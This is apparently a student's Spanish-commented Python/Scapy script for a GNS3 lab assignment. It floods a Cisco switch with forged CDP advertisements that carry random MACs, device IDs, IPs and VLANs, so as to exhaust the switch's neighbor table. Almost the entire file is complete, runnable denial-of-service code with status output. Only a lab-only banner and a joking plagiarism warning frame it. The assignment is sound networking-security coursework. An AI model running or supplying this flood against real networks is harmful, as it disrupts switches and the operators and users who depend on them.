#!/usr/bin/env python3
"""
Codigo para la Tarea Semana 3 (Practica 2)
CDP DoS Attack - Configurado para SW1 en GNS3
Topología: Kali -> SW1 (GigabitEthernet0/1) -> VLAN 10
Documentacion Profecional o almenos lo intento xd
"""

from scapy.all import *
from scapy.contrib.cdp import *
import sys
import os
import time
import random

#CONFIGURACIÓN con Comentarios/ayudas para que entiendan
INTERFACE = "eth0"                      # Interfaz de Kali
CDP_MULTICAST = "01:00:0c:cc:cc:cc"   # Dirección multicast CDP
PACKETS_PER_SECOND = 50                # Paquetes por segundo

#Esta parte crea los paquetes CDP
def create_cdp_packet():
    """
    Crea un paquete CDP malicioso con datos aleatorios
    para saturar la tabla CDP del switch
    """
    
    # Generar datos a lo loco
    random_device = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=30))
    random_platform = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=50))
    random_version = ''.join(random.choices('0123456789.', k=100))
    random_port = f"GigabitEthernet{random.randint(0,3)}/{random.randint(0,3)}"
    
    # Capa 2: Ethernet 802.3
    dot3 = Dot3(
        dst=CDP_MULTICAST,
        src=RandMAC()  # MAC origen aleatoria
    )
    
    # LLC (Logical Link Control)
    llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
    
    # SNAP (Subnetwork Access Protocol)
    snap = SNAP(OUI=0x00000c, code=0x2000)  # OUI Cisco, Code CDP
    
    # CDP Header
    cdp_hdr = CDPv2_HDR(vers=2, ttl=180)
    
    # CDP TLVs (Type-Length-Value)
    cdp_msgs = (
        CDPMsgDeviceID(val=random_device.encode()) /
        CDPMsgSoftwareVersion(val=f"Cisco IOS {random_version}".encode()) /
        CDPMsgPlatform(val=random_platform.encode()) /
        CDPMsgPortID(iface=random_port.encode()) /
        CDPMsgCapabilities(cap=0x00000029) /  # Router + Switch + Host
        CDPMsgAddr(
            naddr=1,
            addr=CDPAddrRecordIPv4(addr=RandIP())
        ) /
        CDPMsgDuplex(duplex=1) /
        CDPMsgVTPMgmtDomain(val=b"FAKE_VTP_DOMAIN") /
        CDPMsgNativeVLAN(vlan=random.randint(1, 4094))
    )
    
    # Ensamblar paquete completo
    packet = dot3 / llc / snap / cdp_hdr / cdp_msgs
    
    return packet


#Aqui Funcion del ATAQUE
def cdp_flood_attack():
    """
    Ejecuta el ataque de para el CDP
    """
    print("\n" + "="*70)
    print("           CDP ATTAQUE PARA EL GNS3")
    print("="*70)
    print(f"\n[+] Objetivo: Switch SW1 (VLAN 10)")
    print(f"[+] Interfaz de ataque: {INTERFACE}")
    print(f"[+] Dirección multicast CDP: {CDP_MULTICAST}")
    print(f"[+] Tasa de envío: {PACKETS_PER_SECOND} paquetes/segundo")
    print(f"\n[!] El ataque saturará la tabla CDP del switch")
    print(f"[!] Presiona Ctrl+C para detener el ataque\n")
    print("="*70 + "\n")
    
    packet_count = 0
    start_time = time.time()
    
    try:
        print("[*] Iniciando flood de paquetes CDP...\n")
        
        while True:
            # Crear paquete CDP malicioso
            pkt = create_cdp_packet()
            
            # Enviar paquete
            sendp(pkt, iface=INTERFACE, verbose=0)
            
            packet_count += 1
            
            # Mostrar estadísticas cada 100 paquetes
            if packet_count % 100 == 0:
                elapsed = time.time() - start_time
                rate = packet_count / elapsed
                
                print(f"[✓] Paquetes enviados: {packet_count:6d} | "
                      f"Tasa: {rate:6.2f} pkt/s | "
                      f"Tiempo: {int(elapsed):4d}s | "
                      f"MAC falsas: ~{packet_count}")
            
            # Control de velocidad
            time.sleep(1.0 / PACKETS_PER_SECOND)
    
    except KeyboardInterrupt:
        print("\n\n[!] Ataque interrumpido por el usuario\n")
    
    finally:
        # Estadísticas finales
        elapsed = time.time() - start_time
        avg_rate = packet_count / elapsed if elapsed > 0 else 0
        
        print("="*70)
        print("                    RESULTADO DEL ATAQUE")
        print("="*70)
        print(f"  Total de paquetes CDP enviados: {packet_count}")
        print(f"  Duración del ataque: {elapsed:.2f} segundos")
        print(f"  Tasa promedio: {avg_rate:.2f} paquetes/segundo")
        print(f"  Dispositivos falsos creados: ~{packet_count}")
        print("="*70)
        print("\n[*] Verifica el switch con: show cdp neighbors")
        print("[*] Verifica el tráfico con: show cdp traffic\n")
        print("[*] Despues de verificar que todo funciona se concluyo el ataque al CDP\n")


#VERIFICACIÓN, para ver si tienes los requisitos
def verificar_requisitos():
    """
    Verifica que se cumplan todos los requisitos
    """
    print("\n[*] Verificando requisitos previos...\n")
    
    # 1. Verificar privilegios root
    if os.geteuid() != 0:
        print("[✗] ERROR: Este script requiere privilegios de root, osea esta parte ya es obvia")
        print("[!] Ejecuta: sudo python3 cdp_dos.py\n")
        return False
    print("[✓] Privilegios de root: OK")
    
    # 2. Verificar interfaz de red
    try:
        mac = get_if_hwaddr(INTERFACE)
        print(f"[✓] Interfaz {INTERFACE}: OK (MAC: {mac})")
    except:
        print(f"[✗] ERROR: Interfaz {INTERFACE} no encontrada")
        print("[!] Interfaces disponibles:")
        for iface in get_if_list():
            print(f"    - {iface}")
        return False
    
    # 3. Verificar módulo CDP de Scapy por si las moscas
    try:
        load_contrib("cdp")
        print("[✓] Módulo Scapy CDP: OK")
    except Exception as e:
        print(f"[✗] ERROR: No se pudo cargar el módulo CDP de Scapy")
        print(f"[!] {str(e)}")
        return False
    
    # 4. Verificar conectividad de red
    try:
        ips = [conf.route.route("0.0.0.0")[2]]
        if ips[0] and ips[0] != "0.0.0.0":
            print(f"[✓] IP configurada: {ips[0]}")
        else:
            print("[!] ADVERTENCIA: No hay IP configurada en la interfaz")
    except:
        print("[!] ADVERTENCIA: No se pudo verificar la IP")
    
    print("\n[✓] Todos los requisitos cumplidos\n")
    return True


# ============ FUNCIÓN PRINCIPAL ============
def main():
    """
    Función principal del script
    """
    # Banner
    print("\n" + "="*70)
    print("                  CDP DoS ATTACK TOOL v1.0")
    print("              Para uso EXCLUSIVO en laboratorio GNS3")
    print("="*70)
    
    # Verificar requisitos
    if not verificar_requisitos():
        sys.exit(1)
    
    # Advertencia legal
    print("\n" + "-"*70)
    print("                         ADVERTENCIA DE PLAGIO")
    print("-"*70)
    print("""
    Este script está diseñado EXCLUSIVAMENTE para entornos de laboratorio
    porfavor no hagan plagio, sino el profe me quitara puntos.
    
    Si usan el script sin Permiso y me acusan de plaguio:
    1. Se lo digo al profe
    2. Se lo digo al cordinador
    3. Se lo digo a tu mama
    
    """)
    print("="*70 + "\n")
    
    # Confirmación del usuario
    try:
        respuesta = input("[?] ¿Deseas continuar con el ataque? (si/no): ").strip().lower()
        if respuesta not in ['si', 's', 'yes', 'y']:
            print("\n[!] Ataque cancelado por el usuario\n")
            sys.exit(0)
    except KeyboardInterrupt:
        print("\n\n[!] Ataque cancelado\n")
        sys.exit(0)
    
    # Ejecutar ataque
    cdp_flood_attack()


#Por si acaso
if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n[✗] Error inesperado: {str(e)}\n")
        sys.exit(1)
